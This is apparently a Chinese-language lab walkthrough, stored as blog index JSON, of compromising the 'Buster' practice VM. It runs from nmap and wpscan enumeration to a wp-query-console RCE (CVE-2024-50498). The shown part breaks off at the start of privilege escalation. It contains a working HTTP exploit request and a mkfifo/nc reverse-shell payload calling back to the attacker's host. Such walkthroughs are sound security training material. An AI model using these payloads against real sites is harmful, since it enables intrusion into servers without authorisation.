[{"content":"hackmymv_buster 难度：easy\n目标IP：10.0.2.11\n本机ip：10.0.2.15\n信息收集 nmap扫描目标开开放端口\n1 2 3 4 5 6 7 8 9 10 11 12 ┌──(root㉿kali)-[~] └─# nmap 10.0.2.11 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-29 11:00 EST Nmap scan report for 10.0.2.11 Host is up (0.00056s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http MAC Address: 08:00:27:96:A0:1B (PCS Systemtechnik/Oracle VirtualBox virtual NIC) Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds 发现开放22端口与80端口,去80端口看看网页\n网页踩点 发现是个wordpress，果断使用wpscan扫描爆破用户名和可能存在的插件漏洞。\n执行命令：\n1 wpscan --url http://10.0.2.11 -e u,ap --plugins-detection aggressive 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 ┌──(root㉿kali)-[~] └─# wpscan --url http://10.0.2.11 -e u,ap --plugins-detection aggressive _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.28 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [i] It seems like you have not updated the database for some time. [+] URL: http://10.0.2.11/ [10.0.2.11] [+] Started: Sun Nov 30 10:24:42 2025 Interesting Finding(s): [+] Headers | Interesting Entry: Server: nginx/1.14.2 | Found By: Headers (Passive Detection) | Confidence: 100% [+] robots.txt found: http://10.0.2.11/robots.txt | Interesting Entries: | - /wp-admin/ | - /wp-admin/admin-ajax.php | Found By: Robots Txt (Aggressive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://10.0.2.11/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://10.0.2.11/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://10.0.2.11/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 6.7.1 identified (Insecure, released on 2024-11-21). | Found By: Meta Generator (Passive Detection) | - http://10.0.2.11/, Match: \u0026#39;WordPress 6.7.1\u0026#39; | Confirmed By: Rss Generator (Aggressive Detection) | - http://10.0.2.11/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=6.7.1\u0026lt;/generator\u0026gt; | - http://10.0.2.11/comments/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=6.7.1\u0026lt;/generator\u0026gt; [i] The main theme could not be detected. [+] Enumerating All Plugins (via Aggressive Methods) 扫描速度偏慢\u0026hellip;\u0026hellip;\n发现漏洞 发现插件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 [i] Plugin(s) Identified: [+] akismet | Location: http://10.0.2.11/wp-content/plugins/akismet/ | Last Updated: 2025-11-12T16:31:00.000Z | Readme: http://10.0.2.11/wp-content/plugins/akismet/readme.txt | [!] The version is out of date, the latest version is 5.6 | | Found By: Known Locations (Aggressive Detection) | - http://10.0.2.11/wp-content/plugins/akismet/, status: 200 | | Version: 5.3.5 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://10.0.2.11/wp-content/plugins/akismet/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - http://10.0.2.11/wp-content/plugins/akismet/readme.txt [+] feed | Location: http://10.0.2.11/wp-content/plugins/feed/ | | Found By: Known Locations (Aggressive Detection) | - http://10.0.2.11/wp-content/plugins/feed/, status: 200 | | The version could not be determined. [+] wp-query-console | Location: http://10.0.2.11/wp-content/plugins/wp-query-console/ | Latest Version: 1.0 (up to date) | Last Updated: 2018-03-16T16:03:00.000Z | Readme: http://10.0.2.11/wp-content/plugins/wp-query-console/README.txt | | Found By: Known Locations (Aggressive Detection) | - http://10.0.2.11/wp-content/plugins/wp-query-console/, status: 403 | | Version: 1.0 (80% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://10.0.2.11/wp-content/plugins/wp-query-console/README.txt 存在插件：akismet、feed、wp-query-console\n发现用户 1 2 3 4 5 6 7 8 9 10 11 12 13 [i] User(s) Identified: [+] ta0 | Found By: Wp Json Api (Aggressive Detection) | - http://10.0.2.11/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Confirmed By: | Rss Generator (Aggressive Detection) | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] welcome | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) 存在用户ta0、welcome\n利用漏洞 搜索插件wp-query-console发现存在RCE漏洞（CVE-2024-50498），且存在页面10.0.2.11/wp-json/wqc/v1/query\n查看POC\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 POST /wp-json/wqc/v1/query HTTP/1.1 Host: kubernetes.docker.internal User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://kubernetes.docker.internal/wp-admin/admin.php?page=wp-query-console Content-Type: application/json Content-Length: 45 Origin: http://kubernetes.docker.internal Connection: keep-alive Priority: u=0 {\u0026#34;queryArgs\u0026#34;:\u0026#34;phpinfo();\u0026#34;,\u0026#34;queryType\u0026#34;:\u0026#34;post\u0026#34;} 利用bp抓包修改参数\n验证漏洞存在，修改命令函数反弹shell\n1 {\u0026#34;queryArgs\u0026#34;:\u0026#34;shell_exec(\u0026#39;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2\u0026gt;\u0026amp;1 | nc 10.0.2.15 4444 \u0026gt;/tmp/f\u0026#39;);\u0026#34;,\u0026#34;queryType\u0026#34;:\u0026#34;post\u0026#34;} 成功反弹shell\n1 2 3 4 5 6 7 ┌──(root㉿kali)-[~/reverse] └─# nc -lnvp 4444 listening on [any] 4444 ... connect to [10.0.2.15] from (UNKNOWN) [10.0.2.11] 55216 /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ /usr/bin/script -qc /bin/bash /dev/null www-data@listen:~/html/wordpress$ 提权 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 www-data@listen:~/html/wordpress$ ls -al ls -al total 248 drwxr-xr-x 5 www-data www-data 4096 Jan 8 2025 . drwxr-xr-x 3 root root 4096 Jan 7 2025 .. -rwxr-xr-x 1 www-data www-data 405 Jan 8 2025 index.php -rwxr-xr-x 1 www-data www-data 19915 Dec 31 2023 license.txt -rwxr-xr-x 1 www-data www-data 7409 Jun 18 2024 readme.html -rw-r--r-- 1 root root 684 Jan 8 2025 update_url.php -rwxr-xr-x 1 www-data www-data 7387 Feb 13 2024 wp-activate.php drwxr-xr-x 9 www-data www-data 4096 Nov 21 2024 wp-admin -rwxr-xr-x 1 www-data www-data 351 Feb 6 2020 wp-blog-header.php -rwxr-xr-x 1 www-data www-data 2323 Jun 14 2023 wp-comments-post.php -rwxr-xr-x 1 www-data www-data 3336 Oct 15 2024 wp-config-sample.php -rw-rw-rw- 1 www-data www-data 3620 Jan 8 2025 wp-config.php drwxr-xr-x 6 www-data www-data 4096 Jan 8 2025 wp-content -rwxr-xr-x 1 www-data www-data 5617 Aug 2 2024 wp-cron.php drwxr-xr-x 30 www-data www-data 12288 Nov 21 2024 wp-includes -rwxr-xr-x 1 www-data www-data 2502 Nov 26 2022 wp-links-opml.php -rwxr-xr-x 1 www-data www-data 3937 Mar 11 2024 wp-load.php -rwxr-xr-x 1 www-data www-data 51367 Sep 30 2024 wp-login.php -rwxr-xr-x 1 www-data www-data 8543 Sep 18 2024 wp-mail.php -rwxr-xr-x 1 www-data www-data 29032 Sep 30 2024 wp-settings.php -rwxr-xr-x 1 www-data www-data 34385 Jun 19 2023 wp-signup.php -rwxr-xr-x 1 www-data www-data 5102 Oct 18 2024 wp-trackback.php -rwxr-xr-x 1 www-data www-data 3246 Mar 2 2024 xmlrpc.php www-data@listen:~/html/wordpress$ 发现存在wp-config.php为配置文件，查看该文件\n","date":"2025-11-30T15:52:52+08:00","image":"https://ON9K.github.io/p/buster/buster_hu_75331cf0256ff1d4.png","permalink":"https://ON9K.github.io/p/buster/","title":"Buster"},{"content":"","date":"2025-11-30T15:44:44+08:00","image":"https://ON9K.github.io/p/nexus/nexus_hu_b7cb03e8e62ab701.png","permalink":"https://ON9K.github.io/p/nexus/","title":"Nexus"}]